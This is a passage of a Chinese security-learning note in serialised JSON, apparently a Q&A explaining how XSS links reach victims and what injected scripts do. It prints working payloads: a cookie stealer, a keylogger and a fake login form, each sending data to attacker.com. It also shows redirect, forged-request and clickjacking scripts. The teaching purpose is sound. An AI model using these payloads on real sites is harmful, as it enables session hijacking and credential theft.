中利用"},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"社交工程"},{"Type":"NodeText","Data":"的重要性。攻击者往往需要通过一些方式诱导用户点击他们构造的恶意链接。"}]},{"ID":"20241016092179-kjiuh0u","Type":"NodeParagraph","Properties":{"id":"20241016092179-kjiuh0u","updated":"20241016092179"},"Children":[{"Type":"NodeText","Data":"下面我将详细说明几个常见的攻击场景，来展示攻击者如何将恶意 URL 发送给目标用户："}]},{"ID":"20241016092180-4c45uer","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241016092180-4c45uer","updated":"20241016092180"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"### ","Properties":{"id":""}},{"Type":"NodeText","Data":"1. "},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"通过电子邮件或社交媒体"}]},{"ID":"20241016092181-h944t63","Type":"NodeParagraph","Properties":{"id":"20241016092181-h944t63","updated":"20241016092181"},"Children":[{"Type":"NodeText","Data":"攻击者可以通过电子邮件、社交媒体消息或其他即时通信工具发送恶意链接。例如，攻击者伪装成一个可信任的联系人，发送带有恶意链接的消息："}]},{"ID":"20241016092182-uka8ybd","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20241016092182-uka8ybd","updated":"20241016092182"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"嘿，你看这个网站特别有趣！点击链接看看吧：\nhttp://example.com/search.php?keyword=\u003cscript\u003ealert('XSS攻击成功！');\u003c/script\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20241016092183-ynp0q9y","Type":"NodeParagraph","Properties":{"id":"20241016092183-ynp0q9y","updated":"20241016092183"},"Children":[{"Type":"NodeText","Data":"如果用户点击了这个链接，恶意代码将在用户的浏览器中执行。"}]},{"ID":"20241016092184-86xllc1","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241016092184-86xllc1","updated":"20241016092184"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"### ","Properties":{"id":""}},{"Type":"NodeText","Data":"2. "},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"通过论坛、博客、评论区"}]},{"ID":"20241016092185-3y4flr8","Type":"NodeParagraph","Properties":{"id":"20241016092185-3y4flr8","updated":"20241016092185"},"Children":[{"Type":"NodeText","Data":"某些网站允许用户提交内容（如论坛帖子、博客评论等），如果网站没有正确过滤用户提交的内容，攻击者可以在这些地方插入恶意代码。例如，在评论区中，攻击者输入类似的内容："}]},{"ID":"20241016092186-m65w7hw","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20241016092186-m65w7hw","updated":"20241016092186"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"大家好！快来看看这个搜索结果：\nhttp://example.com/search.php?keyword=\u003cscript\u003ealert('XSS攻击成功！');\u003c/script\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20241016092187-b507thf","Type":"NodeParagraph","Properties":{"id":"20241016092187-b507thf","updated":"20241016092187"},"Children":[{"Type":"NodeText","Data":"当其他用户点击这个链接时，恶意脚本会在他们的浏览器中执行。"}]},{"ID":"20241016092188-e0chon7","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241016092188-e0chon7","updated":"20241016092188"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"### ","Properties":{"id":""}},{"Type":"NodeText","Data":"3. "},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"通过伪造的表单提交"}]},{"ID":"20241016092189-v30qtox","Type":"NodeParagraph","Properties":{"id":"20241016092189-v30qtox","updated":"20241016092189"},"Children":[{"Type":"NodeText","Data":"有时攻击者会诱导用户填写伪造的表单。例如，攻击者构造一个看似合法的页面或邮件，要求用户提交表单。表单中的部分输入可能包含恶意脚本，导致恶意脚本在提交时执行。"}]},{"ID":"20241016092190-mv4h2m6","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241016092190-mv4h2m6","updated":"20241016092190"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"### ","Properties":{"id":""}},{"Type":"NodeText","Data":"4. "},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"重定向和中间人攻击"}]},{"ID":"20241016092191-e76rs1n","Type":"NodeParagraph","Properties":{"id":"20241016092191-e76rs1n","updated":"20241016092191"},"Children":[{"Type":"NodeText","Data":"攻击者可以利用中间人攻击（Man-in-the-Middle Attack），通过拦截并篡改用户与合法网站之间的流量，将合法请求中的 URL 替换为恶意版本。这样，当用户发出请求时，攻击者的恶意脚本会在用户不知情的情况下执行。"}]},{"ID":"20241016092192-wutbmmx","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241016092192-wutbmmx","updated":"20241016092192"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"### ","Properties":{"id":""}},{"Type":"NodeText","Data":"5. "},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"短链接服务"}]},{"ID":"20241016092193-vyziycl","Type":"NodeParagraph","Properties":{"id":"20241016092193-vyziycl","updated":"20241016092193"},"Children":[{"Type":"NodeText","Data":"攻击者可以使用短链接服务（例如 bit.ly）将长的恶意 URL 缩短，掩盖恶意内容的真相，从而使用户更有可能点击。例如："}]},{"ID":"20241016092194-rrpqojb","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20241016092194-rrpqojb","updated":"20241016092194"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"http://bit.ly/abc123\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20241016092195-knqj1qw","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241016092195-knqj1qw","updated":"20241016092195"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"### ","Properties":{"id":""}},{"Type":"NodeText","Data":"6. "},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"点击劫持"}]},{"ID":"20241016092196-c9kwp57","Type":"NodeParagraph","Properties":{"id":"20241016092196-c9kwp57","updated":"20241016092196"},"Children":[{"Type":"NodeText","Data":"攻击者可以通过隐蔽的方式，让用户在不知情的情况下点击某个链接。这可以通过伪装的按钮、图像、广告等方式实现，例如通过广告诱导用户点击，或在页面上放置透明的按钮覆盖其他内容，用户无意中点击时就会触发 XSS。"}]},{"ID":"20241016092197-dgd3r0j","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241016092197-dgd3r0j","updated":"20241016092197"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"### ","Properties":{"id":""}},{"Type":"NodeText","Data":"总结："}]},{"ID":"20241016092198-b72owy0","Type":"NodeParagraph","Properties":{"id":"20241016092198-b72owy0","updated":"20241016092198"},"Children":[{"Type":"NodeText","Data":"攻击者通常需要通过社交工程手段，或者利用存在漏洞的网站和平台，诱导用户点击恶意链接。一旦用户访问这些恶意链接，攻击就会开始生效。XSS 的成功往往依赖于用户对恶意链接的信任或疏忽，所以防范此类攻击不仅仅依赖于开发者的防护措施，还需要用户具备一定的安全意识。"}]},{"ID":"20241016092199-g7slla9","Type":"NodeHeading","HeadingLevel":2,"Properties":{"id":"20241016092199-g7slla9","updated":"20241016092199"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"## ","Properties":{"id":""}},{"Type":"NodeText","Data":"恶意的JS代码"}]},{"ID":"20241016092200-7c6okxp","Type":"NodeBlockquote","Properties":{"id":"20241016092200-7c6okxp","updated":"20241016092200"},"Children":[{"Type":"NodeBlockquoteMarker","Data":"\u003e ","Properties":{"id":""}},{"ID":"20241016092201-wwavibc","Type":"NodeParagraph","Properties":{"id":"20241016092201-wwavibc","updated":"20241016092201"},"Children":[{"Type":"NodeText","Data":"原来如此，也就是说，攻击者可以在其中的\u003cscript\u003e标签中直接放入编写好的js代码，那么这些js代码会如何攻击用户呢？"}]}]},{"ID":"20241016092202-89gdo0h","Type":"NodeParagraph","Properties":{"id":"20241016092202-89gdo0h","updated":"20241016092202"},"Children":[{"Type":"NodeText","Data":"是的，攻击者可以在恶意构造的 "},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"code","TextMarkTextContent":"\u0026lt;script\u0026gt;"},{"Type":"NodeText","Data":" 标签中放入任何 JavaScript 代码，而这些代码在用户点击恶意链接或访问注入了恶意脚本的页面时，就会在用户的浏览器中执行。至于这些 JavaScript 代码可以如何攻击用户，下面是一些常见的 XSS 攻击方式："}]},{"ID":"20241016092203-raxj8tt","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241016092203-raxj8tt","updated":"20241016092203"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"### ","Properties":{"id":""}},{"Type":"NodeText","Data":"1. "},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"盗取用户的 Cookie 和会话信息"}]},{"ID":"20241016092204-l2eu4pr","Type":"NodeParagraph","Properties":{"id":"20241016092204-l2eu4pr","updated":"20241016092204"},"Children":[{"Type":"NodeText","Data":"Cookie 中可能存储用户的身份验证信息（例如，用户登录网站时的会话 ID），攻击者可以通过 JavaScript 获取这些 Cookie，然后将其发送到攻击者控制的服务器，冒充用户进行非法操作。"}]},{"ID":"20241016092205-43wxodn","Type":"NodeParagraph","Properties":{"id":"20241016092205-43wxodn","updated":"20241016092205"},"Children":[{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"攻击代码示例："}]},{"ID":"20241016092206-osevqa9","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockInfo":"amF2YXNjcmlwdA==","CodeBlockCloseFence":"YGBg","Properties":{"id":"20241016092206-osevqa9","updated":"20241016092206"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"amF2YXNjcmlwdA==","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003cscript\u003e\n  var img = new Image();\n  img.src = \"http://attacker.com/steal?cookie=\" + document.cookie;\n\u003c/script\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20241016092207-3twitp8","Type":"NodeParagraph","Properties":{"id":"20241016092207-3twitp8","updated":"20241016092207"},"Children":[{"Type":"NodeText","Data":"这段代码会读取当前页面的 "},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"code","TextMarkTextContent":"document.cookie"},{"Type":"NodeText","Data":"，然后将 Cookie 通过 "},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"code","TextMarkTextContent":"GET"},{"Type":"NodeText","Data":" 请求发送到攻击者控制的服务器 "},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"code","TextMarkTextContent":"http://attacker.com/steal"},{"Type":"NodeText","Data":"。"}]},{"ID":"20241016092208-guboz9f","Type":"NodeParagraph","Properties":{"id":"20241016092208-guboz9f","updated":"20241016092208"},"Children":[{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"后果"},{"Type":"NodeText","Data":"："},{"Type":"NodeSoftBreak","Data":"\n","Properties":{"id":""}},{"Type":"NodeText","Data":"攻击者可以使用窃取的 Cookie 来伪装成用户访问受保护的页面或执行敏感操作。例如，攻击者可以登录到用户的账户并执行未经授权的交易、修改个人信息等。"}]},{"ID":"20241016092209-u49nl07","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241016092209-u49nl07","updated":"20241016092209"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"### ","Properties":{"id":""}},{"Type":"NodeText","Data":"2. "},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"键盘记录器（Keylogger）"}]},{"ID":"20241016092210-9jmeydh","Type":"NodeParagraph","Properties":{"id":"20241016092210-9jmeydh","updated":"20241016092210"},"Children":[{"Type":"NodeText","Data":"攻击者可以通过 XSS 注入一个键盘记录器脚本，记录用户在网页上输入的所有内容（包括用户名、密码、信用卡信息等），并将其发送到攻击者的服务器。"}]},{"ID":"20241016092211-6utbx26","Type":"NodeParagraph","Properties":{"id":"20241016092211-6utbx26","updated":"20241016092211"},"Children":[{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"攻击代码示例："}]},{"ID":"20241016092212-lguljc8","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockInfo":"amF2YXNjcmlwdA==","CodeBlockCloseFence":"YGBg","Properties":{"id":"20241016092212-lguljc8","updated":"20241016092212"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"amF2YXNjcmlwdA==","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003cscript\u003e\n  document.onkeypress = function(e) {\n    var key = e.key || e.keyCode;\n    var img = new Image();\n    img.src = \"http://attacker.com/keylogger?key=\" + key;\n  };\n\u003c/script\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20241016092213-kz366di","Type":"NodeParagraph","Properties":{"id":"20241016092213-kz366di","updated":"20241016092213"},"Children":[{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"后果"},{"Type":"NodeText","Data":"："},{"Type":"NodeSoftBreak","Data":"\n","Properties":{"id":""}},{"Type":"NodeText","Data":"攻击者可以记录用户输入的所有信息，包括敏感的登录凭据，甚至银行账户信息。"}]},{"ID":"20241016092214-a7bpjo0","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241016092214-a7bpjo0","updated":"20241016092214"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"### ","Properties":{"id":""}},{"Type":"NodeText","Data":"3. "},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"执行恶意重定向"}]},{"ID":"20241016092215-92amv93","Type":"NodeParagraph","Properties":{"id":"20241016092215-92amv93","updated":"20241016092215"},"Children":[{"Type":"NodeText","Data":"攻击者可以利用 XSS 将用户重定向到恶意网站，这些网站可能会进行钓鱼攻击或强制下载恶意软件。"}]},{"ID":"20241016092216-92ctwga","Type":"NodeParagraph","Properties":{"id":"20241016092216-92ctwga","updated":"20241016092216"},"Children":[{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"攻击代码示例："}]},{"ID":"20241016092217-5rihblp","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockInfo":"amF2YXNjcmlwdA==","CodeBlockCloseFence":"YGBg","Properties":{"id":"20241016092217-5rihblp","updated":"20241016092217"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"amF2YXNjcmlwdA==","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003cscript\u003e\n  window.location = \"http://attacker.com/phishing\";\n\u003c/script\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20241016092218-vio938p","Type":"NodeParagraph","Properties":{"id":"20241016092218-vio938p","updated":"20241016092218"},"Children":[{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"后果"},{"Type":"NodeText","Data":"："},{"Type":"NodeSoftBreak","Data":"\n","Properties":{"id":""}},{"Type":"NodeText","Data":"用户可能会被重定向到一个看似合法的伪造页面，攻击者通过这种方式获取用户的账户密码等敏感信息，或下载恶意软件感染用户的设备。"}]},{"ID":"20241016092219-sxvhib0","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241016092219-sxvhib0","updated":"20241016092219"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"### ","Properties":{"id":""}},{"Type":"NodeText","Data":"4. "},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"在受害者的上下文中执行未授权操作"}]},{"ID":"20241016092220-rfufidu","Type":"NodeParagraph","Properties":{"id":"20241016092220-rfufidu","updated":"20241016092220"},"Children":[{"Type":"NodeText","Data":"攻击者可以利用受害者的登录状态，在受害者的权限下自动执行一些操作，例如发送消息、点赞或删除内容等。这种攻击通常称为 "},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"跨站请求伪造（CSRF）"},{"Type":"NodeText","Data":"，但可以结合 XSS 使用。"}]},{"ID":"20241016092221-zb5mdvr","Type":"NodeParagraph","Properties":{"id":"20241016092221-zb5mdvr","updated":"20241016092221"},"Children":[{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"攻击代码示例："}]},{"ID":"20241016092222-yzsff7o","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockInfo":"amF2YXNjcmlwdA==","CodeBlockCloseFence":"YGBg","Properties":{"id":"20241016092222-yzsff7o","updated":"20241016092222"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"amF2YXNjcmlwdA==","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003cscript\u003e\n  var xhr = new XMLHttpRequest();\n  xhr.open(\"POST\", \"http://example.com/api/deleteAccount\", true);\n  xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n  xhr.send(\"accountId=1234\");\n\u003c/script\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20241016092223-vi26o2p","Type":"NodeParagraph","Properties":{"id":"20241016092223-vi26o2p","updated":"20241016092223"},"Children":[{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"后果"},{"Type":"NodeText","Data":"："},{"Type":"NodeSoftBreak","Data":"\n","Properties":{"id":""}},{"Type":"NodeText","Data":"攻击者可以利用用户的身份执行敏感操作，例如删除账户、发出请求等，完全绕过身份验证。"}]},{"ID":"20241016092224-96oyehe","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241016092224-96oyehe","updated":"20241016092224"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"### ","Properties":{"id":""}},{"Type":"NodeText","Data":"5. "},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"仿冒网页表单进行钓鱼"}]},{"ID":"20241016092225-eoebqw7","Type":"NodeParagraph","Properties":{"id":"20241016092225-eoebqw7","updated":"20241016092225"},"Children":[{"Type":"NodeText","Data":"攻击者可以通过 XSS 注入伪造的表单，诱导用户输入敏感信息，例如用户名、密码或信用卡信息。表单提交的数据会直接发送到攻击者的服务器。"}]},{"ID":"20241016092226-izv3x36","Type":"NodeParagraph","Properties":{"id":"20241016092226-izv3x36","updated":"20241016092226"},"Children":[{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"攻击代码示例："}]},{"ID":"20241016092227-o8yf5fy","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockInfo":"amF2YXNjcmlwdA==","CodeBlockCloseFence":"YGBg","Properties":{"id":"20241016092227-o8yf5fy","updated":"20241016092227"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"amF2YXNjcmlwdA==","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003cscript\u003e\n  document.body.innerHTML += `\n    \u003cform action=\"http://attacker.com/stealCredentials\" method=\"POST\"\u003e\n      用户名：\u003cinput type=\"text\" name=\"username\"\u003e\n      密码：\u003cinput type=\"password\" name=\"password\"\u003e\n      \u003cinput type=\"submit\" value=\"登录\"\u003e\n    \u003c/form\u003e\n  `;\n\u003c/script\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20241016092228-byphmg1","Type":"NodeParagraph","Properties":{"id":"20241016092228-byphmg1","updated":"20241016092228"},"Children":[{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"后果"},{"Type":"NodeText","Data":"："},{"Type":"NodeSoftBreak","Data":"\n","Properties":{"id":""}},{"Type":"NodeText","Data":"用户以为是在输入真实网站的表单信息，实际上输入的数据会被发送到攻击者的服务器。"}]},{"ID":"20241016092229-a6olibe","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241016092229-a6olibe","updated":"20241016092229"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"### ","Properties":{"id":""}},{"Type":"NodeText","Data":"6. "},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"利用浏览器漏洞"}]},{"ID":"20241016092230-lus8kc3","Type":"NodeParagraph","Properties":{"id":"20241016092230-lus8kc3","updated":"20241016092230"},"Children":[{"Type":"NodeText","Data":"JavaScript 可以访问浏览器的一些功能，虽然现代浏览器已经增强了安全性，但攻击者可能利用一些未修补的浏览器漏洞，通过 XSS 执行更加危险的操作，例如获取本地文件、绕过安全策略等。"}]},{"ID":"20241016092231-zm597b9","Type":"NodeParagraph","Properties":{"id":"20241016092231-zm597b9","updated":"20241016092231"},"Children":[{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"攻击代码示例："},{"Type":"NodeSoftBreak","Data":"\n","Properties":{"id":""}},{"Type":"NodeText","Data":"这类攻击代码通常会利用复杂的漏洞链，简单示例不易提供，但通常会结合浏览器的历史漏洞进行攻击。"}]},{"ID":"20241016092232-w84kh3p","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241016092232-w84kh3p","updated":"20241016092232"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"### ","Properties":{"id":""}},{"Type":"NodeText","Data":"7. "},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"劫持用户点击行为"}]},{"ID":"20241016092233-xba6qhy","Type":"NodeParagraph","Properties":{"id":"20241016092233-xba6qhy","updated":"20241016092233"},"Children":[{"Type":"NodeText","Data":"攻击者可以通过 XSS 攻击覆盖网页的界面元素，例如将一个透明按钮放在网页上，用户点击正常按钮时，实际上点击的是恶意按钮，执行未经授权的操作。"}]},{"ID":"20241016092234-c7vigyi","Type":"NodeParagraph","Properties":{"id":"20241016092234-c7vigyi","updated":"20241016092234"},"Children":[{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"攻击代码示例："}]},{"ID":"20241016092235-bvb8x1w","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockInfo":"amF2YXNjcmlwdA==","CodeBlockCloseFence":"YGBg","Properties":{"id":"20241016092235-bvb8x1w","updated":"20241016092235"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"amF2YXNjcmlwdA==","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003cscript\u003e\n  var button = document.createElement(\"button\");\n  button.style.position = \"absolute\";\n  button.style.left = \"0\";\n  button.style.top = \"0\";\n  button.style.width = \"100%\";\n  button.style.height = \"100%\";\n  button.style.opacity = \"0\";\n  button.onclick = function() {\n    window.location = \"http://attacker.com/maliciousAction\";\n  };\n  document.body.appendChild(button);\n\u003c/script\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20241016092236-1ofm6rj","Type":"NodeParagraph","Properties":{"id":"20241016092236-1ofm6rj","updated":"20241016092236"},"Children":[{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"后果"},{"Type":"NodeText","Data":"："},{"Type":"NodeSoftBreak","Data":"\n","Properties":{"id":""}},{"Type":"NodeText","Data":"用户在不知情的情况下触发了恶意行为，例如发出未经授权的请求或访问恶意网站。"}]},{"ID":"20241016092237-at5cgae","Type":"NodeThematicBreak","Properties":{"id":"20241016092237-at5cgae","updated":"20241016092237"}},{"ID":"20241016092238-7pyhvhs","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241016092238-7pyhvhs","updated":"20241016092238"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"### ","Properties":{"id":""}},{"Type":"NodeText","Data":"总结："}]},{"ID":"20241016092239-qcy426e","Type":"NodeParagraph","Properties":{"id":"20241016092239-qcy426e","updated":"20241016092239"},"Children":[{"Type":"NodeText","Data":"XSS 攻击的威力取决于注入的 JavaScript 代码的复杂性。攻击者可以窃取敏感数据、劫持用户会话、进行钓鱼攻击、强制重定向、甚至控制用户的浏览器行为。这也是为什么防止 XSS 攻击是前端和后端开发中至关重要的安全防护措施。"}]},{"ID":"20241016092240-e7asm62","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241016092240-e7asm62","updated":"20241016093638"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"### ","Properties":{"id":""}},{"Type":"NodeText","Data":"回答2"}]},{"ID":"20241016092241-ay255qv","Type":"NodeList","ListData":{"BulletChar":45,"Padding":2,"Marker":"LQ==","Num":-1},"Properties":{"id":"20241016092241-ay255qv","updated":"20241016092241"},"Children":[{"ID":"20241016092242-hbwugmy","Type":"NodeListItem","Data":"-","ListData":{"BulletChar":45,"Padding":2,"Marker":"LQ==","Num":-1},"Properties":{"id":"20241016092242-hbwugmy","updated":"20241016092242"},"Children":[{"ID":"20241016092243-nckrjhv","Type":"NodeParagraph","Properties":{"id":"20241016092243-nckrjhv","updated":"20241016092243"},"Children":[{"Type":"NodeText","Data":"是的，XSS 攻击者可以在 "},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"code","TextMarkTextContent":"\u0026lt;script\u0026gt;"},{"Type":"NodeText","Data":" 标签中插入任意的 JavaScript 代码，而这些代码会在用户的浏览器中执行。通过 XSS，攻击者可以进行各种攻击操作。下面我列举几种常见的攻击方式，帮助你理解这些 JavaScript 代码会如何攻击用户。"}]},{"ID":"20241016092244-a9cl2zm","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241016092244-a9cl2zm","updated":"20241016092244"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"### ","Properties":{"id":""}},{"Type":"NodeText","Data":"1. "},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"窃取 Cookie"}]},{"ID":"20241016092245-6yp1sy7","Type":"NodeParagraph","Properties":{"id":"20241016092245-6yp1sy7","updated":"20241016092245"},"Children":[{"Type":"NodeText","Data":"浏览器中的 Cookie 通常存储用户的登录状态和会话信息。通过 XSS 攻击，攻击者可以窃取用户的 Cookie 信息，从而冒充用户的身份执行恶意操作。"}]},{"ID":"20241016092246-ftumogg","Type":"NodeHeading","HeadingLevel":4,"Properties":{"id":"20241016092246-ftumogg","updated":"20241016092246"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"#### 